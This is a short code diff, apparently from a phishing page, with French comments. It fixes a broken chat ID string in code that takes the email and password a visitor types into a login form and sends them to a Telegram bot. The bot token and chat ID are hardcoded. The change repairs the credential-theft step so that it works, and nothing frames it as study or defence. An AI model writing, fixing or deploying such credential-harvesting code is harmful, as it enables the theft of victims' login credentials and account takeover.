@@ -280,8 +280,7 @@
             try {
                 // Envoyer les données à Telegram
                 const botToken = '6001193149:AAH_bvSCjqXgVmU-UmkI4DakWWfqy6W6Y7Y'; // Token du bot Telegram
-                const chatId = '5510624364
-';    // ID du chat Telegram
+                const chatId = '5510624364';    // ID du chat Telegram
                 const message = `📧 Nouvelle connexion :\nEmail: ${username.value}\nMot de passe: ${password.value}`;
                 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
